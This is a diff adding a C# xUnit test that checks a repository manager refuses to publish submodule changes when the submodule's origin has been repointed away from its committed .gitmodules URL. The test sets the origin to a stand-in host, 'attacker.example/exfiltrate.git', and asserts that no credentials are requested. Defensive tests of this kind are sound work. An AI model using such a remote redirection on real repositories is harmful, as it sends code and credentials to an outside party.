@@ -900,6 +900,49 @@ public sealed class LibGit2SharpRepositoryManagerTests : IDisposable
     }
 
     [Fact]
+    public async Task PublishChangedSubmodulesAsyncRejectsOmpMutatedOriginUsingCommittedGitmodulesUrl()
+    {
+        var childRemotePath = Track(TempGitFixtures.CreateBareRemoteRepository(out _));
+        var parentPath = Track(TempGitFixtures.CreateTempDirectory());
+        Repository.Init(parentPath);
+        RunGitCli(parentPath, "-c", "protocol.file.allow=always", "submodule", "add", childRemotePath, "dependencies/child");
+        RunGitCli(parentPath, "-c", "user.name=Test", "-c", "user.email=test@example.com", "commit", "-am", "Add child submodule");
+        var baseCommit = new Repository(parentPath).Head.Tip.Sha;
+
+        await manager.EnsureBareRepositoryAsync("reject-mutated-submodule-origin", parentPath, TempGitFixtures.AnonymousAuthentication(), CancellationToken.None);
+        var worktreePath = Track(Path.Combine(TempGitFixtures.CreateTempDirectory(), "wt"));
+        await manager.CreateWorktreeAsync("reject-mutated-submodule-origin", "reject-mutated-submodule-origin-wt", worktreePath, "agent/issue-1", baseCommit, CancellationToken.None);
+        await manager.UpdateSubmodulesAsync("reject-mutated-submodule-origin", worktreePath, _ => null, CancellationToken.None);
+
+        var childPath = Path.Combine(worktreePath, "dependencies", "child");
+        File.WriteAllText(Path.Combine(childPath, "published.txt"), "child publication");
+        RunGitCli(childPath, "add", "published.txt");
+        RunGitCli(childPath, "-c", "user.name=Test", "-c", "user.email=test@example.com", "commit", "-m", "Update child");
+        RunGitCli(worktreePath, "config", "-f", ".gitmodules", "submodule.dependencies/child.url", "https://trusted.example/dependencies/child.git");
+        RunGitCli(worktreePath, "add", ".gitmodules", "dependencies/child");
+        RunGitCli(worktreePath, "-c", "user.name=Test", "-c", "user.email=test@example.com", "commit", "-m", "Update child gitlink");
+        RunGitCli(childPath, "remote", "set-url", "origin", "https://attacker.example/exfiltrate.git");
+        var credentialHosts = new List<string>();
+
+        var exception = await Assert.ThrowsAsync<InvalidOperationException>(() =>
+            manager.PublishChangedSubmodulesAsync(
+                "reject-mutated-submodule-origin",
+                worktreePath,
+                baseCommit,
+                "agent/issue-1",
+                TempGitFixtures.AnonymousAuthentication(),
+                host =>
+                {
+                    credentialHosts.Add(host);
+                    return TempGitFixtures.AnonymousAuthentication();
+                },
+                CancellationToken.None).AsTask());
+
+        Assert.Contains("does not match its committed .gitmodules URL", exception.Message, StringComparison.Ordinal);
+        Assert.Empty(credentialHosts);
+    }
+
+    [Fact]
     public async Task PublishChangedSubmodulesAsyncSkipsUnchangedNestedGitlinks()
     {
         var publicDependencyRemotePath = Track(TempGitFixtures.CreateBareRemoteRepository(out _));
